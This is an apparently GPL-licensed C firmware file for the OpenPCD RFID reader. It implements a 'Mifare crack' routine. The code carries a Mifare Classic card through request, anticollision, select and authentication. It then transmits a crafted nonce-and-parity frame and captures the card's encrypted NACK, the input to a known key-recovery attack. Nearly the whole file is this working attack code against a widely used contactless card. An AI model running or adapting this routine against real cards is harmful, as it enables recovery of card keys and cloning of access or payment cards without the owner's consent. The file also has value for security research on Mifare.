/*
*	Mifare crack function rountines for OpenPCD
*	written by: Shan Song	Date: 2012-sept-04
*	songshan99@gmail.com
*
*	This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by 
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/
#include "rc632.h"
#include <os/pit.h>
#include "mifare_crack.h"


volatile u_int8_t FlagRxTimeout;
//Important!! must have this volatile keyword or the asyn operation in RC632 irq routine will fail!!
void setFlagRxTimeout()
{
	FlagRxTimeout = 1;
}

void clearFlagRxTimeout()
{
	FlagRxTimeout = 0;
}

void waitFlagRxTimeout()
{
	//return;//debug purpose
	while(1){
	//wait
	if(FlagRxTimeout == 0) break;
	}
	//pit_mdelay(1);//wait 1ms for RC632 FIFO length register, debug purpose
	for(int i=0;i<1000000;i++)
	{}
}

void waitFlagRxTimeout_1()
{
	u_int8_t reg_int_rq;
	while(1){	
		opcd_rc632_reg_read(NULL, RC632_REG_INTERRUPT_RQ, &reg_int_rq);
		if((reg_int_rq & RC632_INT_RX) || (reg_int_rq & RC632_INT_TIMER)) {
			opcd_rc632_reg_write(NULL, RC632_REG_INTERRUPT_RQ, 0x3F);
			return;
		}
	}
}

void waitBytesTime(int bytes)
{
	
}

void initRC632Irq()
{	//clear all existing interrupt flags
	opcd_rc632_reg_write(NULL, RC632_REG_INTERRUPT_RQ, 0x3F);
	//enable timer interrupt and Rx interrupt
	opcd_rc632_reg_write(NULL, RC632_REG_INTERRUPT_EN, RC632_INT_SET|RC632_INT_RX|RC632_INT_TIMER);
	//disable all interrupts
	//opcd_rc632_reg_write(NULL, RC632_REG_INTERRUPT_EN, 0x3F);
}
void initRC632Timer()
{
	//prescaler, 2^7=128, 
	opcd_rc632_reg_write(NULL, RC632_REG_TIMER_CLOCK, 0x07);
	//timer starts at TX end, stops at RX end (wait the tranceive to finish
	opcd_rc632_reg_write(NULL, RC632_REG_TIMER_CONTROL, RC632_TMR_START_TX_END|RC632_TMR_STOP_RX_END);
}

void setRC632Timer(u_int8_t bytecount)
{
//default Rxwait is 6 bit-clock cycles, wait time shall >= 6bit (10bit)-clock + expected bits
//Refer to ISO14443-3 Table2 (page7), the time interval between a transmission and reception
//is about 10 bit cycles.
opcd_rc632_reg_write(NULL, RC632_REG_TIMER_RELOAD, 10+22+bytecount*8);
}

static u_int8_t old_REG_TX_CONTROL, old_REG_CHANNEL_REDUNDANCY, old_REG_CRC_PRESET_LSB, old_REG_CRC_PRESET_MSB,old_REG_INTERRUPT_EN, old_REG_TIMER_CLOCK, old_REG_TIMER_CONTROL;
void backupRC632Reg()
{
	opcd_rc632_reg_read(NULL, RC632_REG_TX_CONTROL, &old_REG_TX_CONTROL);
	opcd_rc632_reg_read(NULL, RC632_REG_CHANNEL_REDUNDANCY, &old_REG_CHANNEL_REDUNDANCY);
	opcd_rc632_reg_read(NULL, RC632_REG_CRC_PRESET_LSB, &old_REG_CRC_PRESET_LSB);
	opcd_rc632_reg_read(NULL, RC632_REG_CRC_PRESET_MSB, &old_REG_CRC_PRESET_MSB);
	opcd_rc632_reg_read(NULL, RC632_REG_INTERRUPT_EN, &old_REG_INTERRUPT_EN);
	opcd_rc632_reg_read(NULL, RC632_REG_TIMER_CLOCK, &old_REG_TIMER_CLOCK);
	opcd_rc632_reg_read(NULL, RC632_REG_TIMER_CONTROL, &old_REG_TIMER_CONTROL);
	//TODO: consider shall we backup the timer related registers?
}
void restoreRC632Reg()
{
	opcd_rc632_reg_write(NULL, RC632_REG_TX_CONTROL, old_REG_TX_CONTROL);
	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, old_REG_CHANNEL_REDUNDANCY);
	opcd_rc632_reg_write(NULL, RC632_REG_CRC_PRESET_LSB, old_REG_CRC_PRESET_LSB);
	opcd_rc632_reg_write(NULL, RC632_REG_CRC_PRESET_MSB, old_REG_CRC_PRESET_MSB);
	//disable timer interrupt and Rx interrupt and then restore the value
	opcd_rc632_reg_write(NULL, RC632_REG_INTERRUPT_EN, RC632_INT_RX|RC632_INT_TIMER);
	opcd_rc632_reg_write(NULL, RC632_REG_INTERRUPT_EN, old_REG_INTERRUPT_EN | RC632_INT_SET);
	
	opcd_rc632_reg_write(NULL, RC632_REG_TIMER_CLOCK, old_REG_TIMER_CLOCK);
	opcd_rc632_reg_write(NULL, RC632_REG_TIMER_CONTROL, old_REG_TIMER_CONTROL);
}

static u_int8_t REQA=0x26;
static u_int8_t SELECT[2]={0x93,0x20};
static u_int8_t SELECT_UID[7]={0x93,0x70,0,0,0,0,0};
static u_int8_t AUTH_BLK_N[2]={0x60, 0x00};
static u_int8_t BUFFER[16];
//maybe we don't need a return value at all...
int mifare_fixed_Nt_attack(struct mifare_crack_params *params)
{

	//TODO: find a way to fix Nt. Need a proper method to delay 1ms here.
	
	int temp;

	//store registor old values
	backupRC632Reg();
	//initialize the timer configuration
	initRC632Timer();
	//enable the RC632 timer interrupt and idle interrupt
	initRC632Irq();
	
	
	//prepare data for later use
	AUTH_BLK_N[1]=params->BLOCK;
	
	//send idle command, debug purpose, temporarily delete this
	//opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_IDLE);
	//disable TX1 and TX2. See if we need to wait here...
	//opcd_rc632_reg_write(NULL, RC632_REG_TX_CONTROL, 0x58);
	//TODO: need to add wait delay for disable/enable TX, because RC632 needs time to respond
	
	//////////////////////////////
	//do REQA
	//set 7bit short frame
	opcd_rc632_reg_write(NULL, RC632_REG_BIT_FRAMING, 0x07);
	//disable CRC and enable parity
	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, 0x03);
	//enable TX1 and TX2
	//opcd_rc632_reg_write(NULL, RC632_REG_TX_CONTROL, 0x5B);
	
	//do the REQA tranceive
	setRC632Timer(2);//important!! do not leave the timer uninitialized!!
	setFlagRxTimeout();
	opcd_rc632_fifo_write(NULL, sizeof(REQA), &REQA, 0);
	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
	waitFlagRxTimeout();//wait for the command to finish	
	//waitFlagRxTimeout_1();

	temp = opcd_rc632_fifo_read(NULL, 2, BUFFER);//read fifo, should get 0x20,00. Do we need to wait here?
	if(temp != 2){
		//check num of bytes returned, if incorrect, exit with error code
		params->result = -1;
		params->BLOCK=temp;//use BLOCK to store the error message
		goto exit;
	}
	
	//////////////////////////////
	//do anti collision
	//tranceive, send 0x93 20
	setRC632Timer(5);
	setFlagRxTimeout();
	opcd_rc632_fifo_write(NULL, sizeof(SELECT), SELECT, 0);
	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
	//waitFlagRxTimeout_1();
	waitFlagRxTimeout();//wait for the command to finish
	temp = opcd_rc632_fifo_read(NULL, 5, SELECT_UID+2);//read fifo, should get UID BCC	
	
	if(temp != 5){
		//check num of bytes returned, if incorrect, exit with error code
		params->result = -2;
		params->BLOCK=temp;//use BLOCK to store the error message
		goto exit;
	}
	
	
	//enable TX CRC and odd parity, RX CRC disabled
	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, 0x07);
	//load crc initial value, LSB and MSB. maybe move this to the very beginning?
	opcd_rc632_reg_write(NULL, RC632_REG_CRC_PRESET_LSB, 0x63);
	opcd_rc632_reg_write(NULL, RC632_REG_CRC_PRESET_MSB, 0x63);
	
	//do a tranceive: select(UID): 0x93, 70, UID, BCC 
	setRC632Timer(3);
	setFlagRxTimeout();
	opcd_rc632_fifo_write(NULL, sizeof(SELECT_UID), SELECT_UID, 0);
	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
	//waitFlagRxTimeout_1();
	waitFlagRxTimeout();//wait for the command to finish
	temp = opcd_rc632_fifo_read(NULL, 3, BUFFER);//read fifo, should get SAK, with 2-byte CRC-A
	
	if(temp != 3){
		//check num of bytes returned, if incorrect, exit with error code
		params->result = -3;
		params->BLOCK=temp;//use BLOCK to store the error message
		goto exit;
	}
	
	//we should cope the UIC BCC
	for(int i=0;i<5;i++)
		params->UID_BCC[i] = SELECT_UID[2+i];
		
	//////////////////////////////
	//do Auth block N
	//do a tranceive: 0x60 NN CRC_A
	setRC632Timer(4);
	setFlagRxTimeout();
	opcd_rc632_fifo_write(NULL, sizeof(AUTH_BLK_N), AUTH_BLK_N, 0);
	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
	//waitFlagRxTimeout_1();
	waitFlagRxTimeout();//wait for the command to finish
	temp = opcd_rc632_fifo_read(NULL, 4, params->Nt_actual);//read fifo, should get 32-bit Nt
	
	if(temp != 4){
		//check num of bytes returned, if incorrect, exit with error code
		params->result = -4;
		params->BLOCK=temp;//use BLOCK to store the error message
		goto exit;
	}
	
	//////////////////////////////
	//send the hacking Nr_Ar_Parity
	//disable CRC and parity for TX and RX
	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, 0x00);
	//do a tranceive: Nr_Ar_Parity, 9-bytes with parity bits embedded in bit stream
	setRC632Timer(1);
	setFlagRxTimeout();
	opcd_rc632_fifo_write(NULL, 9, params->Nr_Ar_Parity, 0);
	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
	//waitFlagRxTimeout_1();
	waitFlagRxTimeout();//wait for the command to finish
	temp = opcd_rc632_fifo_read(NULL, 1, &(params->NACK_encrypted));//read fifo, should get NACK or nothing
	
	switch(temp){
	case 0:
		params->result = -6;
		params->BLOCK=temp;//use BLOCK to store the error message
		goto exit;
		break;
	case 1:
		params->result = 0;
		break;
	default:
		params->result = -5;
		params->BLOCK=temp;//use BLOCK to store the error message
		goto exit;
		break;
	}
	
	//////////////////////////////
	//prepare information to return through USB
	
exit:	
	// restore the old register values?
	restoreRC632Reg();
	return params->result;
}

